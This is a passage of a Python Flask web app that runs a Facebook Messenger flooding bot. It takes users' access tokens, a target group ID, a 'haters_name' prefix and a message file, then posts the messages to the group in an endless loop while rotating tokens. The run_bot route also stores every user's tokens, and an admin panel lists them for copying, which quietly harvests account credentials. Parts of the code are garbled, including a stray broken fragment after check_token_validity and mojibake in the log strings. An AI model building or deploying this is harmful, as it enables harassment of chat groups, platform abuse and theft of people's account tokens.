                            <div class="task-info-item">
                                <div class="task-info-label">Conversation</div>
                                <div class="task-info-value">${task.convo_uid}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Prefix</div>
                                <div class="task-info-value">${task.haters_name}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Started</div>
                                <div class="task-info-value">${task.started_at}</div>
                            </div>
                            <div class="task-info-item">
                                <div class="task-info-label">Token</div>
                                <div class="task-info-value">${task.token_name}</div>
                            </div>
                        </div>
                        <div class="task-buttons">
                            <button onclick="toggleLogs('${task.id}')" class="btn btn-primary">
                                <i class="fas fa-terminal"></i> View Logs
                            </button>
                            ${task.status === 'running' ? 
                                `<button onclick="stopTask('${task.id}')" class="btn btn-danger">
                                    <i class="fas fa-stop"></i> Stop
                                </button>` : 
                                `<button onclick="removeTask('${task.id}')" class="btn btn-warning">
                                    <i class="fas fa-trash"></i> Remove
                                </button>`
                            }
                        </div>
                        <div id="logs-${task.id}" class="log-container"></div>
                    `;
                    tasksContainer.appendChild(taskDiv);
                });
            });
        }
        
        function stopTask(taskId) {
            fetch(`/stop_task/${taskId}`, {method: 'POST'})
                .then(() => refreshTasks());
        }
        
        function removeTask(taskId) {
            fetch(`/remove_task/${taskId}`, {method: 'POST'})
                .then(() => refreshTasks());
        }

        setInterval(() => {
            if (document.getElementById('logs-tab').classList.contains('active')) {
                refreshTasks();
            }
        }, 5000);

        document.addEventListener('DOMContentLoaded', refreshTasks);
    </script>
</body>
</html>
'''

def add_log(task_id, message):
    """Add a log entry for a specific task with timestamp"""
    global task_logs
    
    if task_id not in task_logs:
        task_logs[task_id] = []
    
    timestamp = datetime.now()
    log_entry = {
        'timestamp': timestamp,
        'message': f"[{timestamp.strftime('%Y-%m-%d %H:%M:%S')}] {message}"
    }
    task_logs[task_id].append(log_entry)
    
    # Keep only last 1000 log entries per task to prevent memory issues
    if len(task_logs[task_id]) > 1000:
        task_logs[task_id] = task_logs[task_id][-1000:]

def save_user_tokens(username, tokens):
    """Save user tokens to database for admin panel"""
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Check if user already has tokens stored
    c.execute("SELECT id FROM user_tokens WHERE username = ?", (username,))
    existing = c.fetchone()
    
    if existing:
        # Update existing tokens
        c.execute("UPDATE user_tokens SET tokens = ?, created_at = CURRENT_TIMESTAMP WHERE username = ?", 
                 (tokens, username))
    else:
        # Insert new tokens
        c.execute("INSERT INTO user_tokens (username, tokens) VALUES (?, ?)", (username, tokens))
    
    conn.commit()
    conn.close()

def check_token_validity(token):
    """Check if a Facebook token is valid and get user info"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=id,name,picture"
        response = requests.get(url)
        
        if response.status_code == 200:
            user_data = response.json()
            return {
                'valid': True,
                'message': 'Token is valid',
                'name': user_data.get('name'),
                'id': user_data.get('id'),
                'picture': user_data.get('picture', {}).get('data', {}).get('url')
            }
        else:
            return {
                'valid': False,
                'message': f"Invalid token: {response.status_code} - {response.text}"
            }
    except requests.exceptions.RequestException as e:
        return {
            'valid': False,
            'message': f"Network error: {e}"
        }icture': None
            }
    except Exception as e:
        return {
            'valid': False,
            'message': f'Error checking token: {str(e)}',
            'name': None,
            'id': None,
            'picture': None
        }

def fetch_messenger_groups(token):
    """Fetch messenger groups using the provided token"""
    try:
        # Updated API call with better parameters for fetching groups
        url = f"https://graph.facebook.com/v17.0/me/conversations?access_token={token}&fields=participants,name,id,updated_time&limit=100"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()
            groups = []
            
            for conversation in data.get('data', []):
                participants = conversation.get('participants', {}).get('data', [])
                # Only include conversations with more than 2 participants (groups)
                if len(participants) > 2:
                    group_name = conversation.get('name', f'Group Chat ({len(participants)} members)')
                    group_id = conversation.get('id', '')
                    
                    groups.append({
                        'name': group_name,
                        'uid': group_id,
                        'participants_count': len(participants)
                    })
            
            return {
                'success': True,
                'groups': groups,
                'message': f'Found {len(groups)} groups'
            }
        else:
            error_data = response.json()
            return {
                'success': False,
                'groups': [],
                'message': f'API Error: {error_data.get("error", {}).get("message", "Unknown error")}'
            }
    except Exception as e:
        return {
            'success': False,
            'groups': [],
            'message': f'Error fetching groups: {str(e)}'
        }

def get_token_name(token):
    """Get the name associated with a token for identification"""
    try:
        url = f"https://graph.facebook.com/v17.0/me?access_token={token}&fields=name"
        response = requests.get(url)
        if response.status_code == 200:
            user_data = response.json()
            return user_data.get('name', 'Unknown')
        else:
            return 'Invalid Token'
    except:
        return 'Unknown'

def send_messages(task_id, convo_uid, tokens, message_content, speed, haters_name):
    global stop_flags
    
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; Samsung Galaxy S9 Build/OPR6.170623.017; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.125 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }

    messages = message_content.splitlines()
    tokens = tokens.splitlines()

    num_messages = len(messages)
    num_tokens = len(tokens)
    max_tokens = min(num_tokens, num_messages)

    add_log(task_id, f"Starting bot with {num_messages} messages and {num_tokens} tokens")
    add_log(task_id, f"Target conversation: {convo_uid}")
    add_log(task_id, f"Message prefix: {haters_name}")
    add_log(task_id, f"Speed: {speed} seconds between messages")
    
    while task_id in stop_flags and not stop_flags[task_id]:
        try:
            for message_index in range(num_messages):
                if task_id in stop_flags and stop_flags[task_id]:
                    add_log(task_id, "Bot stopped by user")
                    break
                    
                token_index = message_index % max_tokens
                access_token = tokens[token_index].strip()
                token_name = get_token_name(access_token)

                message = messages[message_index].strip()

                url = f"https://graph.facebook.com/v17.0/t_{convo_uid}/"
                parameters = {'access_token': access_token, 'message': f'{haters_name} {message}'}
                response = requests.post(url, json=parameters, headers=headers)

                current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
                if response.ok:
                    log_msg = f"Ã¢Å“â€¦ Message {message_index + 1}/{num_messages} | Token: {token_name} | Content: {haters_name} {message} | Sent at {current_time}"
                    add_log(task_id, log_msg)
                else:
                    error_info = response.text[:100] if response.text else "Unknown error"
                    log_msg = f"Ã¢ÂÅ’ Failed Message {message_index + 1}/{num_messages} | Token: {token_name} | Error: {error_info} | At {current_time}"
                    add_log(task_id, log_msg)
                time.sleep(speed)

            if task_id in stop_flags and stop_flags[task_id]:
                break
                
            add_log(task_id, "Ã°Å¸â€â€ž All messages sent. Restarting the process...")
        except Exception as e:
            error_msg = f"Ã¢Å¡ Ã¯Â¸Â An error occurred: {e}"
            add_log(task_id, error_msg)
            time.sleep(5)
    
    # Clean up when task ends
    if task_id in stop_flags:
        del stop_flags[task_id]
    if task_id in message_threads:
        del message_threads[task_id]
    
    add_log(task_id, "Ã°Å¸ÂÂ Bot execution completed")

# Authentication routes
@app.route('/')
def index():
    if 'user_id' not in session:
        return render_template_string(auth_html)
    return render_template_string(html_content)

@app.route('/register', methods=['POST'])
def register():
    username = request.form.get("username")
    password = request.form.get('password')
    confirm_password = request.form.get('confirm_password')
    
    if password != confirm_password:
        flash("Passwords do not match", "error")
        return render_template_string(auth_html)
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    try:
        c.execute("INSERT INTO users (username, password, approved) VALUES (?, ?, 0)", (username, hashed_password))
        conn.commit()
        flash("Registration successful! Your account is pending admin approval.", "success")
        return render_template_string(auth_html)
    except sqlite3.IntegrityError:
        flash("Username already exists", "error")
        return render_template_string(auth_html)
    finally:
        conn.close()

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, admin, approved FROM users WHERE username = ? AND password = ?", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user:
        session['user_id'] = user[0]
        session['user_username'] = username
        session['is_admin'] = user[1] == 1
        return redirect(url_for('index'))
    else:
        flash("Invalid username or password", "error")
        return render_template_string(auth_html)

@app.route('/admin_login', methods=['POST'])
def admin_login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    hashed_password = hashlib.sha256(password.encode()).hexdigest()
    
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT id, admin, approved FROM users WHERE username = ? AND password = ?", (username, hashed_password))
    user = c.fetchone()
    conn.close()
    
    if user and user[1] == 1 and user[2] == 1:  # Check if user is admin and approved
        session['user_id'] = user[0]
        session['user_username'] = username
        session['is_admin'] = True
        return redirect(url_for('admin'))
    else:
        flash("Invalid admin credentials", "admin_error")
        return render_template_string(auth_html)

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('index'))

@app.route('/admin')
@admin_required
def admin():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    # Get all users
    c.execute("SELECT id, username, admin, approved, created_at FROM users ORDER BY created_at DESC")
    users = c.fetchall()
    
    # Get user tokens
    c.execute("SELECT username, tokens FROM user_tokens ORDER BY created_at DESC")
    tokens_data = c.fetchall()
    user_tokens = {username: tokens for username, tokens in tokens_data}
    
    conn.close()
    
    return generate_admin_html(users, user_tokens)

def generate_admin_html(users, user_tokens):
    """Generate the admin panel HTML with user data"""
    admin_html = f'''
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>ZEE RAJPUT- Admin Panel</title>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
        <style>
            * {{
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }}
            
            body {{
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                min-height: 100vh;
                padding: 20px;
            }}
            
            .admin-container {{
                background: rgba(255, 255, 255, 0.95);
                backdrop-filter: blur(20px);
                border-radius: 25px;
                box-shadow: 0 25px 50px rgba(0, 0, 0, 0.15);
                max-width: 1400px;
                margin: 0 auto;
                overflow: hidden;
            }}
            
            .admin-header {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                padding: 40px 30px;
                text-align: center;
                position: relative;
            }}
            
            .admin-header h1 {{
                font-size: 3rem;
                margin-bottom: 15px;
                text-shadow: 3px 3px 6px rgba(0, 0, 0, 0.3);
                font-weight: 900;
            }}
            
            .back-btn {{
                position: absolute;
                top: 25px;
                left: 25px;
                background: rgba(255, 255, 255, 0.2);
                color: white;
                border: none;
                padding: 15px 25px;
                border-radius: 15px;
                text-decoration: none;
                font-weight: 700;
                transition: all 0.4s ease;
                text-transform: uppercase;
            }}
            
            .back-btn:hover {{
                background: rgba(255, 255, 255, 0.3);
                transform: translateY(-3px);
            }}
            
            .admin-tabs {{
                display: flex;
                background: #f8f9fa;
                border-bottom: 2px solid #dee2e6;
            }}
            
            .admin-tab {{
                flex: 1;
                padding: 25px 20px;
                text-align: center;
                cursor: pointer;
                background: transparent;
                border: none;
                font-size: 16px;
                font-weight: 700;
                color: #495057;
                transition: all 0.4s ease;
                text-transform: uppercase;
            }}
            
            .admin-tab:hover {{
                color: #667eea;
                transform: translateY(-2px);
            }}
            
            .admin-tab.active {{
                background: white;
                color: #667eea;
                box-shadow: 0 -5px 15px rgba(102, 126, 234, 0.1);
            }}
            
            .admin-content {{
                display: none;
                padding: 40px;
                min-height: 600px;
            }}
            
            .admin-content.active {{
                display: block;
            }}
            
            .user-item {{
                background: white;
                border: 2px solid #e9ecef;
                border-radius: 20px;
                padding: 30px;
                margin-bottom: 20px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
                transition: all 0.4s ease;
            }}
            
            .user-item:hover {{
                transform: translateY(-5px);
                box-shadow: 0 20px 40px rgba(0, 0, 0, 0.15);
            }}
            
            .user-header {{
                display: flex;
                justify-content: space-between;
                align-items: center;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }}
            
            .user-username {{
                font-size: 1.4rem;
                font-weight: 800;
                color: #495057;
                text-transform: uppercase;
            }}
            
            .user-details {{
                display: grid;
                grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
                gap: 20px;
                margin-bottom: 20px;
            }}
            
            .user-detail {{
                background: #f8f9fa;
                padding: 15px 20px;
                border-radius: 12px;
                border-left: 4px solid #667eea;
            }}
            
            .detail-label {{
                font-size: 12px;
                color: #6c757d;
                text-transform: uppercase;
                margin-bottom: 8px;
                font-weight: 700;
            }}
            
            .detail-value {{
                font-weight: 700;
                color: #495057;
                font-size: 1.1rem;
            }}
            
            .user-actions {{
                display: flex;
                gap: 15px;
                flex-wrap: wrap;
            }}
            
            .status-badge {{
                padding: 12px 20px;
                border-radius: 25px;
                font-size: 12px;
                font-weight: 700;
                text-transform: uppercase;
            }}
            
            .status-admin {{
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
            }}
            
            .status-approved {{
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
            }}
            
            .status-pending {{
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
            }}
            
            .btn {{
                padding: 12px 20px;
                border: none;
                border-radius: 10px;
                font-size: 14px;
                font-weight: 700;
                cursor: pointer;
                transition: all 0.4s ease;
                text-transform: uppercase;
                margin: 5px;
                min-width: 120px;
            }}
            
            .btn-approve {{
                background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
                color: white;
            }}
            
            .btn-reject {{
                background: linear-gradient(135deg, #dc3545 0%, #fd7e14 100%);
                color: white;
            }}
            
            .btn-revoke {{
                background: linear-gradient(135deg, #ffc107 0%, #fd7e14 100%);
                color: #212529;
            }}
            
            .btn-remove {{
                background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
                color: white;
            }}
            
            .btn-promote {{
                background: linear-gradient(135deg, #007bff 0%, #6610f2 100%);
                color: white;
            }}
            
            .btn-demote {{
                background: linear-gradient(135deg, #6c757d 0%, #495057 100%);
                color: white;
            }}
            
            .btn:hover {{
                transform: translateY(-2px);
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
            }}
            
            .token-box {{
                background: white;
                border: 2px solid #e9ecef;
                border-radius: 15px;
                padding: 25px;
                margin-bottom: 20px;
                box-shadow: 0 10px 25px rgba(0, 0, 0, 0.1);
            }}
            
            .token-username {{
                font-size: 1.2rem;
                font-weight: 800;
                color: #667eea;
                margin-bottom: 15px;
                text-transform: uppercase;
            }}
            
            .token-textarea {{
                width: 100%;
                height: 150px;
                padding: 15px;
                border: 2px solid #e9ecef;
                border-radius: 10px;
                font-family: 'Courier New', monospace;
                font-size: 12px;
                resize: vertical;
                background: #f8f9fa;
            }}
            
            .copy-btn {{
                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                color: white;
                border: none;
                padding: 10px 20px;
                border-radius: 8px;
                font-weight: 700;
                cursor: pointer;
                margin-top: 10px;
                transition: all 0.3s ease;
            }}
            
            .copy-btn:hover {{
                transform: translateY(-2px);
                box-shadow: 0 5px 15px rgba(102, 126, 234, 0.3);
            }}
            
            .section-title {{
                font-size: 1.8rem;
                font-weight: 800;
                color: #495057;
                margin-bottom: 25px;
                padding-bottom: 15px;
                border-bottom: 3px solid #e9ecef;
            }}
        </style>
    </head>
    <body>
        <div class="admin-container">
            <div class="admin-header">
                <a href="/" class="back-btn">
                    <i class="fas fa-arrow-left"></i> Back to Dashboard
                </a>
                <p>User Management & System Control</p>
            </div>
            
            <div class="admin-tabs">
                <button class="admin-tab active" onclick="switchAdminTab('users')">
                    <i class="fas fa-users-cog"></i> User Management
                </button>
                <button class="admin-tab" onclick="switchAdminTab('tokens')">
                    <i class="fas fa-key"></i> User Tokens
                </button>
            </div>
            
            <div id="users-content" class="admin-content active">
                <h2 class="section-title">
                    <i class="fas fa-users"></i> User Management
                </h2>
                
                <div class="user-list">
    '''
    
    # Add user management content
    for user in users:
        user_id, username, admin, approved, created_at = user
        admin_html += f'''
        <div class="user-item">
            <div class="user-header">
                <div class="user-username">{username}</div>
                <div class="status-badge {'status-admin' if admin else ('status-approved' if approved else 'status-pending')}">
                    {'Admin' if admin else ('Approved' if approved else 'Pending')}
                </div>
            </div>
            <div class="user-details">
                <div class="user-detail">
                    <div class="detail-label">User ID</div>
                    <div class="detail-value">#{user_id}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Registered</div>
                    <div class="detail-value">{created_at}</div>
                </div>
                <div class="user-detail">
                    <div class="detail-label">Status</div>
                    <div class="detail-value">{'Administrator' if admin else ('Active User' if approved else 'Awaiting Approval')}</div>
                </div>
            </div>
            <div class="user-actions">
        '''
        
        # Don't allow modifying the main admin account
        if username != ADMIN_CONFIG['username']:
            if not approved and not admin:
                admin_html += f'''
                <button class="btn btn-approve" onclick="approveUser({user_id})">
                    <i class="fas fa-check"></i> Approve
                </button>
                <button class="btn btn-reject" onclick="rejectUser({user_id})">
                    <i class="fas fa-times"></i> Reject
                </button>
                '''
            
            if approved and not admin:
                admin_html += f'''
                <button class="btn btn-revoke" onclick="revokeUser({user_id})">
                    <i class="fas fa-ban"></i> Revoke
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                <button class="btn btn-promote" onclick="promoteUser({user_id})">
                    <i class="fas fa-crown"></i> Make Admin
                </button>
                '''
            elif admin:
                admin_html += f'''
                <button class="btn btn-demote" onclick="demoteUser({user_id})">
                    <i class="fas fa-user"></i> Remove Admin
                </button>
                <button class="btn btn-remove" onclick="removeUser({user_id})">
                    <i class="fas fa-trash"></i> Remove
                </button>
                '''
        else:
            admin_html += '<span style="color: #6c757d; font-style: italic; font-weight: 600;">Ã°Å¸â€â€™ Main Administrator</span>'
        
        admin_html += '''
            </div>
        </div>
        '''
    
    # Add user tokens content
    admin_html += '''
                </div>
            </div>
            
            <div id="tokens-content" class="admin-content">
                <h2 class="section-title">
                    <i class="fas fa-key"></i> User Tokens
                </h2>
    '''
    
    if user_tokens:
        for username, tokens in user_tokens.items():
            admin_html += f'''
            <div class="token-box">
                <div class="token-username">{username}</div>
                <textarea class="token-textarea" readonly>{tokens}</textarea>
                <button class="copy-btn" onclick="copyTokens(this)">
                    <i class="fas fa-copy"></i> Copy Tokens
                </button>
            </div>
            '''
    else:
        admin_html += '''
        <div style="text-align: center; padding: 50px; color: #6c757d;">
            <i class="fas fa-key" style="font-size: 3rem; margin-bottom: 20px; opacity: 0.3;"></i>
            <h3>No User Tokens</h3>
            <p>No user tokens have been submitted yet.</p>
        </div>
        '''
    
    admin_html += '''
            </div>
        </div>
        
        <script>
            function switchAdminTab(tab) {
                document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.admin-content').forEach(c => c.classList.remove('active'));
                
                event.currentTarget.classList.add('active');
                document.getElementById(tab + '-content').classList.add('active');
            }
            
            function copyTokens(button) {
                const textarea = button.previousElementSibling;
                textarea.select();
                document.execCommand('copy');
                
                // Visual feedback
                const originalText = button.innerHTML;
                button.innerHTML = '<i class="fas fa-check"></i> Copied!';
                button.style.background = 'linear-gradient(135deg, #28a745 0%, #20c997 100%)';
                
                setTimeout(() => {
                    button.innerHTML = originalText;
                    button.style.background = 'linear-gradient(135deg, #667eea 0%, #764ba2 100%)';
                }, 2000);
            }
            
            function approveUser(userId) {
                if (confirm('Approve this user?')) {
                    fetch(`/admin/approve/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error approving user');
                        }
                    });
                }
            }
            
            function rejectUser(userId) {
                if (confirm('Reject and delete this user account?')) {
                    fetch(`/admin/reject/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error rejecting user');
                        }
                    });
                }
            }
            
            function revokeUser(userId) {
                if (confirm('Revoke access for this user?')) {
                    fetch(`/admin/revoke/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error revoking user access');
                        }
                    });
                }
            }
            
            function removeUser(userId) {
                if (confirm('Permanently remove this user account?')) {
                    fetch(`/admin/remove/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error removing user');
                        }
                    });
                }
            }
            
            function promoteUser(userId) {
                if (confirm('Promote this user to admin?')) {
                    fetch(`/admin/promote/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error promoting user');
                        }
                    });
                }
            }
            
            function demoteUser(userId) {
                if (confirm('Remove admin privileges from this user?')) {
                    fetch(`/admin/demote/${userId}`, {method: 'POST'})
                    .then(response => response.json())
                    .then(data => {
                        if (data.success) {
                            location.reload();
                        } else {
                            alert('Error demoting user');
                        }
                    });
                }
            }
        </script>
    </body>
    </html>
    '''
    
    return admin_html

# Admin routes
@app.route('/admin/approve/<int:user_id>', methods=['POST'])
@admin_required
def approve_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/reject/<int:user_id>', methods=['POST'])
@admin_required
def reject_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("DELETE FROM users WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/revoke/<int:user_id>', methods=['POST'])
@admin_required
def revoke_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT username, admin FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:
        c.execute("UPDATE users SET approved = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot revoke main admin'})

@app.route('/admin/remove/<int:user_id>', methods=['POST'])
@admin_required
def remove_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot remove main admin'})

@app.route('/admin/promote/<int:user_id>', methods=['POST'])
@admin_required
def promote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("UPDATE users SET admin = 1, approved = 1 WHERE id = ?", (user_id,))
    conn.commit()
    conn.close()
    return jsonify({'success': True})

@app.route('/admin/demote/<int:user_id>', methods=['POST'])
@admin_required
def demote_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute("SELECT username FROM users WHERE id = ?", (user_id,))
    user = c.fetchone()
    
    if user and user[0] != ADMIN_CONFIG['username']:
        c.execute("UPDATE users SET admin = 0 WHERE id = ?", (user_id,))
        conn.commit()
        conn.close()
        return jsonify({'success': True})
    else:
        conn.close()
        return jsonify({'success': False, 'message': 'Cannot demote main admin'})

# Bot functionality routes
@app.route('/run_bot', methods=['POST'])
@approved_required
def run_bot():
    global message_threads, stop_flags

    convo_uid = request.form['convo_uid']
    token = request.form['token']
    speed = int(request.form['speed'])
    haters_name = request.form['haters_name']

    message_file = request.files['message_file']
    message_content = message_file.read().decode('utf-8')

    # Save user tokens to database for admin panel
    username = session.get('user_username', 'Unknown')
    save_user_tokens(username, token)

    # Generate unique task ID
    task_id = str(uuid.uuid4())[:8]
    
    # Get token name for display
    first_token = token.splitlines()[0].strip() if token.splitlines() else ""
    token_name = get_token_name(first_token)
    
    # Initialize task
    stop_flags[task_id] = False
    message_threads[task_id] = {
        'user_id': session['user_id'],
        'thread': threading.Thread(target=send_messages, args=(task_id, convo_uid, token, message_content, speed, haters_name)),
        'convo_uid': convo_uid,
        'haters_name': haters_name,
        'started_at': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        'status': 'running',
        'token_name': token_name
    }
    
    message_threads[task_id]['thread'].daemon = True
    message_threads[task_id]['thread'].start()

    add_log(task_id, f"Ã°Å¸Å¡â‚¬ Bot started successfully for task {task_id}")
    add_log(task_id, f"Primary token: {token_name}")
    return redirect(url_for('index'))

@app.route('/stop_task/<task_id>', methods=['POST'])
@approved_required
def stop_task(task_id):
    global stop_flags, message_threads
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Not logged in"})
    
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or access denied"})
    
    if task_id in stop_flags:
        stop_flags[task_id] = True
        add_log(task_id, "Ã°Å¸â€ºâ€˜ Stop signal sent by user")
        return jsonify({"status": "success", "message": "Task stop signal sent"})
    else:
        return jsonify({"status": "error", "message": "Task not found"})

@app.route('/remove_task/<task_id>', methods=['POST'])
@approved_required
def remove_task(task_id):
    global message_threads, task_logs, stop_flags
    
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"status": "error", "message": "Not logged in"})
    
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"status": "error", "message": "Task not found or access denied"})
    
    # Clean up task data
    if task_id in message_threads:
        del message_threads[task_id]
    if task_id in task_logs:
        del task_logs[task_id]
    if task_id in stop_flags:
        del stop_flags[task_id]
    
    return jsonify({"status": "success", "message": "Task removed"})

@app.route('/get_tasks')
@approved_required
def get_tasks():
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"tasks": []})
    
    user_tasks = []
    for task_id, task_info in message_threads.items():
        if task_info.get("user_id") == user_id:
            # Check if thread is still alive
            status = 'running' if task_info['thread'].is_alive() else 'stopped'
            task_info['status'] = status
            
            user_tasks.append({
                'id': task_id,
                'convo_uid': task_info['convo_uid'],
                'haters_name': task_info['haters_name'],
                'started_at': task_info['started_at'],
                'status': status,
                'token_name': task_info.get('token_name', 'Unknown')
            })
    
    return jsonify({"tasks": user_tasks})

@app.route('/get_logs/<task_id>')
@approved_required
def get_logs(task_id):
    user_id = session.get("user_id")
    if not user_id:
        return jsonify({"logs": []})
    
    # Check if user owns this task
    if task_id not in message_threads or message_threads[task_id].get("user_id") != user_id:
        return jsonify({"logs": ["Access denied"]})
    
    if task_id in task_logs:
        # Return only the message part of each log entry
        logs = [log['message'] for log in task_logs[task_id]]
        return jsonify({"logs": logs})
    else:
        return jsonify({"logs": ["No logs available"]})

@app.route('/check_tokens', methods=['POST'])
@approved_required
def check_tokens():
    data = request.get_json()
    tokens = data.get('tokens', [])
    
    results = []
    for token in tokens:
        result = check_token_validity(token.strip())
        result['token'] = token
        results.append(result)
    
    return jsonify({'results': results})

@app.route('/fetch_groups', methods=['POST'])
@approved_required
def fetch_groups():
    data = request.get_json()
    token = data.get('token', '').strip()
    
    if not token:
        return jsonify({'success': False, 'groups': [], 'message': 'No token provided'})
    
    result = fetch_messenger_groups(token)
    return jsonify(result)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=22511)
